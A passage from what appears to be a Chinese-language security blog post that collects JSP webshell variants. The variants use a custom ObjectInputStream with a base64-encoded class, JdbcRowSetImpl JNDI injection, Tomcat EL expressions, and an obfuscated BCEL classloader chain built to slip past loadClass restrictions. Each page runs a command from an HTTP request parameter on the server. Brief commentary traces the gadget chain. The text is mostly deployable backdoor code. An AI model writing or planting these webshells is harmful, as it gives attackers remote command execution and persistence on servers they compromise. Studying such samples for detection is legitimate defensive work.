    String resutl = new String(IOUtils.readFully(new FileInputStream(new File(outputFile)), -1, true));
    response.getOutputStream().write(resutl.getBytes());
%>
</body>
</html>
```

## 重写ObjectInputStream.resolveClass实现反序列化readObject触发的JSP Webshell

其实这里恶意类就用上面的也行

```java
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ObjectInputStream" %>
<%@ page import="java.io.ObjectStreamClass" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.util.Base64" %>
<html>
<body>
<h2>重写ObjectInputStream.resolveClass实现反序列化readObject触发的JSP Webshell</h2>
<%
    class Custom extends ObjectInputStream {

        public Custom(InputStream in) throws IOException {
            super(in);
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc)
                throws IOException, ClassNotFoundException {
            String name = desc.getName();
            String tmp = System.getProperty("java.io.tmpdir");
            Files.write(Paths.get(tmp + File.separator + "CMD"), request.getParameter("threedr3am").getBytes());
            Files.write(Paths.get(tmp + File.separator + "Threedr3am_12.class"), Base64.getDecoder().decode("yv66vgAAADQAtgoAJgBXBwBYCgACAFcIAFkKAFoAWwkAWgBcCgBdAF4HAF8KAAIAYAkAYQBiCABjCgACAGQKAGUAZgoAZwBoCgAIAGkKAGoAawoAagBsCgBtAG4HAG8HAHAKABQAcQoAEwByCgATAHMIAHQHAHUKABkAdgoAGQB3BwB4CgAcAFcHAHkKAB4AegcAewoAIABXCgAeAHwKAH0AfgoAHAB/CgCAAIEHAIIHAIMBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFAAAAAAAAAAEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxYWFhYOwEACnJlYWRPYmplY3QBAB4oTGphdmEvaW8vT2JqZWN0SW5wdXRTdHJlYW07KVYBAAN0bXABABJMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEADmJ1ZmZlcmVkUmVhZGVyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAEbGluZQEAAWUBABVMamF2YS9sYW5nL1Rocm93YWJsZTsBAAJpcwEAG0xqYXZhL2lvL09iamVjdElucHV0U3RyZWFtOwEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQANU3RhY2tNYXBUYWJsZQcAewcAhAcAWAcAXwcAhQcAbwcAdQEACkV4Y2VwdGlvbnMBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAVYnl0ZUFycmF5T3V0cHV0U3RyZWFtAQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwcAhgcAhwEAClNvdXJjZUZpbGUBAAlYWFhYLmphdmEMAC0ALgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAOamF2YS5pby50bXBkaXIHAIgMAIkAigwAiwCMBwCNDACOAI8BABBqYXZhL2xhbmcvU3RyaW5nDACQAJEHAJIMAJMANwEAA0NNRAwAlACVBwCWDACXAJgHAJkMAJoAmwwALQCcBwCdDACeAJ8MAKAAoQcAogwAowCkAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMAC0ApQwALQCmDACnAJUBAAEKAQATamF2YS9sYW5nL1Rocm93YWJsZQwAqAAuDAAtAI8BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQEAGmphdmEvaW8vT2JqZWN0T3V0cHV0U3RyZWFtDAAtAKkBAARYWFhYDACqAKsHAKwMAK0AsAwAsQCyBwCzDAC0ALUBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBABlqYXZhL2lvL09iamVjdElucHV0U3RyZWFtAQATamF2YS9pby9JbnB1dFN0cmVhbQEAE2phdmEvaW8vSU9FeGNlcHRpb24BACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9uaW8vZmlsZS9QYXRocwEAA2dldAEAOyhMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL25pby9maWxlL1BhdGg7AQATamF2YS9uaW8vZmlsZS9GaWxlcwEADHJlYWRBbGxCeXRlcwEAGChMamF2YS9uaW8vZmlsZS9QYXRoOylbQgEABShbQilWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAD3ByaW50U3RhY2tUcmFjZQEAGShMamF2YS9pby9PdXRwdXRTdHJlYW07KVYBAAt3cml0ZU9iamVjdAEAFShMamF2YS9sYW5nL09iamVjdDspVgEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXRFbmNvZGVyAQAHRW5jb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcjsBAAt0b0J5dGVBcnJheQEABCgpW0IBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAA5lbmNvZGVUb1N0cmluZwEAFihbQilMamF2YS9sYW5nL1N0cmluZzsAIQAgACYAAQAnAAEAGgAoACkAAQAqAAAAAgArAAMAAQAtAC4AAQAvAAAALwABAAEAAAAFKrcAAbEAAAACADAAAAAGAAEAAAAWADEAAAAMAAEAAAAFADIAMwAAAAIANAA1AAIALwAAAXUABQAIAAAAjrsAAlm3AANNEgS4AAVOsgAGLbYAB7sACFm7AAJZtwADLbYACbIACrYACRILtgAJtgAMA70ACLgADbgADrcADzoEuAAQGQS2ABG2ABI6BbsAE1m7ABRZGQW3ABW3ABY6BhkGtgAXWToHxgASLBkHtgAJEhi2AAlXp//ppwAITi22ABq7ABlZLLYADLcAG78AAQAIAHoAfQAZAAMAMAAAADIADAAAABoACAAcAA4AHQAVAB4AQQAfAE4AIABgACIAawAjAHoAJwB9ACUAfgAmAIIAKAAxAAAAXAAJAA4AbAA2ADcAAwBBADkAOAA3AAQATgAsADkAOgAFAGAAGgA7ADwABgBoABIAPQA3AAcAfgAEAD4APwADAAAAjgAyADMAAAAAAI4AQABBAAEACACGAEIAQwACAEQAAAAzAAT/AGAABwcARQcARgcARwcASAcASAcASQcASgAA/wAZAAMHAEUHAEYHAEcAAEIHAEsEAEwAAAAEAAEAGQAJAE0ATgACAC8AAABrAAMAAgAAACu7ABxZtwAdTLsAHlkrtwAfuwAgWbcAIbYAIrIABrgAIyu2ACS2ACW2AAexAAAAAgAwAAAAEgAEAAAALAAIAC0AGgAuACoAMgAxAAAAFgACAAAAKwBPAFAAAAAIACMAUQBSAAEATAAAAAYAAgBTAFQAAgBVAAAAAgBWAK8AAAAKAAEAgAB9AK4ACQ=="));
            return Class.forName(name, false, new URLClassLoader(new URL[]{new URL("file:" + tmp + File.separator)}));
        }
    }
    try {
        new Custom(new ByteArrayInputStream(Base64.getDecoder().decode("rO0ABXNyAARYWFhYAAAAAAAAAAECAAB4cA=="))).readObject();
    } catch (Exception e) {
        response.getOutputStream().write(e.getCause().getMessage().getBytes());
    }
%>
</body>
</html>
```

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

/**
 * @author threedr3am
 */
public class Threedr3am_12 implements Serializable {
  private static final long serialVersionUID = 1L;

  private void  readObject(ObjectInputStream is) throws Throwable {
    StringBuilder stringBuilder = new StringBuilder();
    try {
      String tmp = System.getProperty("java.io.tmpdir");
      String cmd = new String(Files.readAllBytes(Paths.get(tmp + File.separator + "CMD")));
      InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
      String line;
      while((line = bufferedReader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
      }
    } catch (Throwable e) {
      e.printStackTrace();
    }
    throw new Throwable(stringBuilder.toString());
  }

  public static void main(String[] args) throws IOException {
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    new ObjectOutputStream(byteArrayOutputStream).writeObject(new Threedr3am_12());
    System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
  }

}
```

## 使用JdbcRowSetImpl进行jndi注入的JSP Webshell

```java
<%@ page import="com.sun.rowset.JdbcRowSetImpl" %>
<%
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
    JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
    jdbcRowSet.setDataSourceName(request.getParameter("threedr3am"));//ldap://localhost:43658/Calc
    try {
        jdbcRowSet.setAutoCommit(true);
    } catch (Throwable e) {
        response.getOutputStream().write(e.getCause().getMessage().getBytes());
    }
%>
```

## 利用tomcat el的JSP Webshell

```java
<%@ page import="javax.el.ELProcessor" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%
    StringBuilder stringBuilder = new StringBuilder();
    String cmd = request.getParameter("cvedr3am");
    for (String tmp:cmd.split(" ")) {
        stringBuilder.append("'").append(tmp).append("'").append(",");
    }
    String f = stringBuilder.substring(0, stringBuilder.length() - 1);
    ELProcessor processor = new ELProcessor();
    Process process = (Process) processor.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](["+ f +"]).start()\")");
    InputStream inputStream = process.getInputStream();
    StringBuilder stringBuilder2 = new StringBuilder();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while((line = bufferedReader.readLine()) != null) {
        stringBuilder2.append(line).append("\n");
    }
    if (stringBuilder2.length() > 0) {
        response.getOutputStream().write(stringBuilder2.toString().getBytes());
    }
%>
```

```java
<%@ page import="java.io.InputStream" %>
<%@ page import="javax.el.ELContext" %>
<%@ page import="javax.el.ELManager" %>
<%@ page import="javax.el.ExpressionFactory" %>
<%@ page import="javax.el.ValueExpression" %>
<%@ page import="sun.misc.IOUtils" %>
<%
    String cmd = request.getParameter("threedr3am");
    StringBuilder stringBuilder = new StringBuilder();
    for (String tmp:cmd.split(" ")) {
        stringBuilder.append("'").append(tmp).append("'").append(",");
    }
    String f = stringBuilder.substring(0, stringBuilder.length() - 1);
    String expression = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](["+ f +"]).start()\")";
    ELManager manager = new ELManager();
    ELContext context = manager.getELContext();
    ExpressionFactory factory = ELManager.getExpressionFactory();
    ValueExpression ve = factory.createValueExpression(context, "${" + expression + "}", Object.class);
    InputStream inputStream = ((Process)ve.getValue(context)).getInputStream();
    response.getOutputStream().write(IOUtils.readFully(inputStream, -1, false));
%>
```

## 对BCEL类加载器进行一定包装-可能在某些禁了loadClass方法的地方bypass的JSP Webshell

```java
<%@ page import="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.lang.reflect.Array" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.security.Provider.Service" %>
<%@ page import="com.sun.org.apache.bcel.internal.util.ClassLoader" %>
<%@ page import="java.util.Iterator" %>
<%@ page import="java.util.List" %>
<%@ page import="javax.activation.DataHandler" %>
<%@ page import="javax.activation.DataSource" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.CipherInputStream" %>
<%@ page import="javax.crypto.CipherSpi" %>
<%@ page import="jdk.nashorn.internal.objects.Global" %>
<%@ page import="jdk.nashorn.internal.objects.NativeString" %>
<%@ page import="jdk.nashorn.internal.runtime.Context" %>
<%@ page import="jdk.nashorn.internal.runtime.options.Options" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.io.File" %>
<%@ page import="java.nio.file.Paths" %>
<html>
<body>
<h2>BCEL类加载器进行一定包装-可能在某些禁了loadClass方法的地方bypass的JSP Webshell</h2>
<%
    String tmp = System.getProperty("java.io.tmpdir");
    Files.write(Paths.get(tmp + File.separator + "CMD"), request.getParameter("threedr3am").getBytes());

    Class serviceNameClass = Class
            .forName("com.sun.xml.internal.ws.util.ServiceFinder$ServiceName");
    Constructor serviceNameConstructor = serviceNameClass.getConstructor(String.class, URL.class);
    serviceNameConstructor.setAccessible(true);
    Object serviceName = serviceNameConstructor.newInstance(new String(new byte[] {36,36,66,67,69,76,36,36,36,108,36,56,98,36,73,36,65,36,65,36,65,36,65,36,65,36,65,36,65,36,56,100,85,36,53,98,87,36,84,87,36,85,36,102,101,36,79,36,98,57,36,99,99,48,36,56,99,36,53,99,36,56,50,36,100,99,36,98,52,36,98,54,36,102,54,36,56,50,36,69,36,85,82,36,98,53,90,36,98,57,84,107,36,97,48,36,119,53,36,109,36,114,36,73,77,105,107,36,116,36,99,57,36,110,36,77,36,115,36,57,57,116,50,36,82,121,106,36,102,102,36,56,100,36,99,102,36,102,54,36,110,97,36,57,53,36,100,53,36,51,101,36,102,54,36,99,49,36,55,102,36,100,50,36,51,102,81,36,102,97,36,57,100,73,36,67,107,36,113,36,97,101,54,36,120,36,100,57,36,57,51,36,98,100,36,99,102,36,98,101,36,55,99,36,102,98,36,51,98,103,36,99,102,121,36,102,51,36,99,102,36,101,102,36,55,102,36,67,36,102,56,36,77,36,72,36,71,36,36,36,101,50,36,56,101,36,56,54,89,36,68,36,53,100,36,98,56,36,97,51,99,36,99,101,36,99,48,36,51,99,36,87,52,36,55,99,36,97,49,36,102,52,36,98,98,36,100,100,36,98,56,36,56,55,36,95,117,36,100,99,87,74,36,100,50,36,99,48,36,111,36,57,54,36,77,36,55,99,36,56,53,36,72,36,71,36,97,50,120,104,36,101,48,36,82,36,57,54,36,57,53,36,102,56,36,100,97,36,99,48,99,36,97,52,52,36,97,99,104,88,53,36,81,36,99,51,36,84,36,68,36,68,88,83,36,101,50,36,104,36,106,36,101,98,36,103,36,100,50,36,71,70,36,98,48,97,36,101,48,36,118,54,53,108,105,36,102,56,86,36,109,36,98,97,36,54,48,36,57,55,109,36,101,102,36,97,101,36,52,48,36,117,36,51,101,36,98,57,36,118,36,81,36,53,101,116,36,102,50,82,36,97,48,36,95,101,36,57,55,36,101,53,106,36,97,100,36,57,52,36,57,53,36,101,101,36,56,54,36,57,53,36,122,36,100,50,36,83,75,57,57,36,97,98,36,98,56,105,36,98,57,36,98,54,36,100,50,36,53,98,36,99,54,36,98,48,36,98,55,107,87,36,57,53,36,102,55,36,99,54,36,97,101,36,120,101,36,100,101,36,98,100,105,36,57,53,36,57,101,36,53,100,36,98,102,53,36,95,36,97,48,36,95,36,101,52,36,56,97,36,101,100,36,98,99,36,53,101,36,97,57,36,97,50,36,99,50,36,102,55,36,97,99,36,88,86,36,97,50,104,36,57,53,36,76,36,56,57,36,98,52,36,101,55,36,100,97,36,101,53,36,67,36,98,100,66,36,98,57,82,36,53,101,36,97,48,36,99,55,36,36,87,106,36,107,36,56,100,36,100,50,36,119,36,74,36,77,53,36,106,109,36,116,36,98,49,36,55,99,106,36,97,54,111,111,36,98,54,36,98,54,36,98,51,36,112,36,53,100,36,57,57,95,36,57,55,86,36,53,101,36,98,97,36,67,36,97,51,36,116,36,56,101,36,99,57,36,99,48,36,75,36,55,100,36,99,51,36,97,99,77,116,66,36,57,101,36,97,52,36,102,51,36,101,98,36,83,36,97,52,36,98,51,36,97,102,36,56,48,36,100,51,36,101,53,36,53,99,36,100,53,36,72,36,57,49,36,97,99,36,100,57,69,36,51,102,36,100,98,36,100,56,36,90,36,55,99,36,97,100,36,114,36,101,53,36,57,98,36,102,54,36,97,99,36,100,99,36,102,51,36,86,36,97,98,36,101,50,119,36,99,100,36,78,36,101,50,36,57,101,104,36,99,56,36,102,56,52,36,97,55,36,70,36,56,99,36,98,52,83,115,115,36,102,50,36,56,49,36,101,100,36,100,51,36,85,36,54,48,98,70,36,114,53,36,102,49,36,107,36,36,36,74,36,56,99,36,98,99,36,97,51,36,65,36,53,98,83,36,120,51,36,98,54,51,67,36,97,54,36,102,50,36,98,54,36,97,98,36,101,49,36,51,98,36,84,36,100,98,36,102,56,36,53,101,36,97,48,36,102,102,36,101,100,36,81,36,84,36,51,102,36,101,48,71,36,78,36,99,102,76,36,102,99,36,56,52,113,36,102,50,36,98,55,36,98,56,36,98,50,100,36,99,50,66,86,67,36,99,101,68,36,107,36,99,52,36,98,54,99,36,97,50,36,56,48,36,53,100,85,36,100,50,36,100,54,36,98,48,103,36,101,50,57,36,56,97,36,115,74,36,117,107,112,76,84,36,102,48,36,98,51,36,99,48,112,103,36,100,97,72,65,36,72,36,101,50,36,57,98,107,36,119,36,57,100,36,95,36,97,97,36,115,36,51,99,100,36,99,57,36,97,99,36,110,48,36,100,56,36,56,49,88,36,84,53,36,53,99,36,100,50,36,102,48,36,99,50,36,99,52,36,51,101,36,53,101,36,57,50,36,98,56,36,65,36,90,36,56,49,36,55,101,36,57,101,100,36,102,55,100,36,99,101,107,103,36,74,36,87,36,78,54,36,55,101,80,36,102,53,36,113,77,36,51,100,36,70,36,101,57,36,97,100,36,98,57,78,69,36,98,97,36,100,101,36,56,49,36,99,48,36,57,53,36,102,56,36,100,57,36,102,51,52,36,100,57,36,101,57,36,56,56,69,36,97,100,74,69,36,57,54,121,36,99,97,36,97,54,36,102,102,87,36,99,52,36,101,57,36,97,54,36,57,98,109,36,54,48,36,99,100,36,55,100,36,101,100,36,97,101,36,99,97,36,56,97,36,101,53,90,36,57,101,67,36,97,50,116,36,99,102,105,122,36,76,36,57,99,36,56,102,119,36,97,99,36,100,97,36,101,99,36,97,97,36,99,99,36,101,56,36,106,70,36,116,36,100,54,36,121,111,36,57,55,99,36,83,98,36,76,36,67,36,102,51,36,106,36,56,48,108,36,98,102,36,84,36,53,98,36,109,36,99,55,36,100,57,36,99,99,36,75,36,105,51,36,57,98,36,97,52,36,122,36,55,102,36,98,102,88,76,36,107,120,74,36,106,36,56,100,119,36,75,36,57,101,36,100,99,78,36,75,68,36,101,50,36,100,98,73,53,36,101,55,36,68,36,97,55,36,70,36,100,55,107,101,36,99,102,36,36,36,98,49,71,36,56,51,36,102,56,78,36,57,52,36,97,49,36,52,48,103,36,122,36,98,51,36,57,97,36,122,36,102,57,82,36,101,54,36,69,36,115,36,102,101,36,56,51,78,110,85,78,86,36,97,98,36,102,51,36,56,49,74,36,122,36,112,79,36,51,99,36,120,36,70,54,36,55,99,36,97,52,36,53,100,36,101,100,36,99,99,36,100,99,36,98,55,36,55,98,121,107,65,36,102,53,48,120,36,98,97,36,100,52,36,103,36,55,100,101,36,100,53,36,86,36,88,36,118,36,102,102,36,70,36,100,48,87,36,110,36,36,36,99,102,36,57,102,36,100,101,36,78,36,100,55,36,99,97,36,99,57,36,65,36,57,56,36,101,53,36,98,50,36,116,36,76,36,101,97,36,100,99,36,101,98,36,100,99,36,100,56,36,97,97,36,97,52,36,97,97,36,57,97,36,101,101,36,100,48,36,100,53,50,36,51,101,36,99,52,36,70,36,98,101,36,57,97,36,100,53,36,97,55,36,76,66,77,51,36,101,53,36,102,98,36,100,52,36,83,36,55,99,36,75,36,51,101,36,112,83,36,78,36,56,56,36,100,55,36,102,101,36,102,50,36,72,36,57,52,81,36,100,102,36,100,56,36,56,51,36,99,98,36,57,52,102,36,100,51,36,56,49,36,118,36,51,101,36,101,50,83,36,99,55,36,99,55,36,101,100,36,54,48,36,102,49,36,57,48,36,100,54,36,117,109,36,98,102,36,107,36,97,49,36,120,36,100,51,36,52,48,36,101,56,113,36,121,36,55,99,36,56,56,72,36,101,97,36,73,36,100,49,76,36,99,98,114,36,98,53,36,79,36,101,100,55,36,101,56,36,57,52,36,98,49,110,36,56,97,36,51,97,36,56,99,36,100,48,36,108,36,56,56,36,107,36,97,50,36,101,55,36,81,102,36,68,36,101,55,86,36,79,36,100,49,36,55,98,36,97,100,36,56,101,36,98,101,36,51,97,36,102,97,87,36,56,102,48,36,99,48,36,97,56,88,102,36,98,97,36,56,49,36,99,49,36,71,36,99,101,36,99,102,36,56,53,36,99,55,36,99,50,117,36,77,101,36,101,54,36,111,36,55,102,36,110,54,53,36,87,81,36,118,36,56,54,36,118,36,98,54,36,53,101,36,106,36,102,102,36,102,100,36,75,122,36,56,97,36,57,57,71,36,97,55,36,57,56,36,101,102,36,81,99,36,53,98,36,97,102,36,56,57,71,36,56,55,36,68,36,57,55,87,67,36,99,56,36,99,55,36,55,102,36,56,51,36,97,56,36,56,49,36,53,101,90,36,102,98,36,118,36,72,48,36,99,98,36,57,98,100,36,74,36,56,51,36,98,99,53,36,56,54,36,102,56,36,100,101,36,90,36,97,54,36,101,102,36,70,122,36,56,102,36,97,50,36,56,97,49,36,99,101,36,102,57,69,36,102,99,66,74,84,36,97,102,36,56,102,36,97,48,36,100,49,36,100,102,36,99,50,36,116,36,89,103,36,99,101,89,36,100,99,36,99,54,36,86,36,102,101,36,101,98,98,36,101,99,85,76,36,109,36,99,101,36,101,99,79,36,90,57,36,56,57,36,118,36,56,52,36,102,57,36,107,36,56,98,36,100,49,36,51,97,78,36,79,36,97,97,36,100,52,36,97,101,97,36,100,97,71,36,98,49,36,56,102,36,90,36,57,50,36,75,36,55,99,36,99,97,36,100,102,36,69,36,99,50,36,99,55,36,77,36,56,56,104,36,98,56,36,97,101,36,101,49,36,56,54,36,102,102,36,98,100,36,97,57,36,102,49,36,57,97,36,99,52,49,36,99,98,36,75,90,36,56,49,36,97,52,36,56,54,36,53,98,97,36,71,36,100,101,36,102,54,36,97,57,36,102,102,36,102,99,95,36,98,53,36,51,100,36,102,101,36,116,74,36,72,36,65,36,65}), null);
    Object serviceNameArray = Array.newInstance(serviceNameClass, 1);
    Array.set(serviceNameArray, 0, serviceName);

    Class lazyIteratorClass = Class
            .forName("com.sun.xml.internal.ws.util.ServiceFinder$LazyIterator");
    Constructor lazyIteratorConstructor = lazyIteratorClass.getDeclaredConstructors()[1];
    lazyIteratorConstructor.setAccessible(true);
    Object lazyIterator = lazyIteratorConstructor.newInstance(String.class, new ClassLoader());
    Field namesField = lazyIteratorClass.getDeclaredField("names");
    namesField.setAccessible(true);
    namesField.set(lazyIterator, serviceNameArray);

    Constructor cipherConstructor = Cipher.class
            .getDeclaredConstructor(CipherSpi.class, Service.class, Iterator.class, String.class,
                    List.class);
    cipherConstructor.setAccessible(true);
    Cipher cipher = (Cipher) cipherConstructor.newInstance(null, null, lazyIterator, null, null);
    Field opmodeField = Cipher.class.getDeclaredField("opmode");
    opmodeField.setAccessible(true);
    opmodeField.set(cipher, 1);
    Field initializedField = Cipher.class.getDeclaredField("initialized");
    initializedField.setAccessible(true);
    initializedField.set(cipher, true);
    CipherInputStream cipherInputStream = new CipherInputStream(
            new ByteArrayInputStream(new byte[0]), cipher);

    Class xmlDataSourceClass = Class
            .forName("com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource");
    Constructor xmlDataSourceConstructor = xmlDataSourceClass.getDeclaredConstructors()[0];
    xmlDataSourceConstructor.setAccessible(true);
    DataSource xmlDataSource = (DataSource) xmlDataSourceConstructor
            .newInstance("", cipherInputStream);
    DataHandler dataHandler = new DataHandler(xmlDataSource);
    Base64Data base64Data = new Base64Data();
    Field dataHandlerField = Base64Data.class.getDeclaredField("dataHandler");
    dataHandlerField.setAccessible(true);
    dataHandlerField.set(base64Data, dataHandler);
    Constructor NativeStringConstructor = NativeString.class
            .getDeclaredConstructor(CharSequence.class, Global.class);
    NativeStringConstructor.setAccessible(true);
    NativeString nativeString = (NativeString) NativeStringConstructor
            .newInstance(base64Data, new Global(new Context(new Options(""), null, null)));

    try {
        new HashMap<>().put(nativeString, "111");
    } catch (Throwable e) {
        response.getOutputStream().write(e.getCause().getMessage().getBytes());
    }
%>
</body>
</html>
```

不得不说三梦师傅真的太强了.....到底是怎样发现这种利用链的呢？
这里简单跟了一下链子（`触发点处断个点即可`），大体利用链如下：

```
jdk.nashorn.internal.objects.NativeString#hashCode()
	com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString()
		com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#get()
			 com.sun.xml.internal.bind.v2.util.ByteArrayOutputStreamEx#readFrom()]
			 	CipherInputStream#read()
			 	CipherInputStream#getMoreData()
			 		javax.crypto.Cipher#doFinal()
			 		javax.crypto.Cipher#chooseFirstProvider()
			 		.....
```

至于为什么用bcel呢？
在我换成了简单的byte之后：发现会出现编码问题。

![image-20221114215610429](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202211142156570.png)

